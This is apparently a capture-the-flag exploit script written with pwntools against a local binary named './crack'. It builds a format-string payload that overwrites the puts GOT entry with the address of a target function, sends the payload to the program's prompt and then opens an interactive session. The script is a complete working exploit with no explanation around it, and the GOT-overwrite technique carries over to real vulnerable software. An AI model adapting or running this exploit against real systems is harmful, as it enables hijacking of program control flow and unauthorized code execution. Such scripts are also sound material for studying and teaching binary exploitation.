#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

putsGot = 0x804A01C
bullet = 0x804872B

io = process("./crack")
payload = fmtstr_payload(10, {putsGot: bullet})
io.sendlineafter(" ? ", payload)

io.sendline()
io.interactive()
io.close()
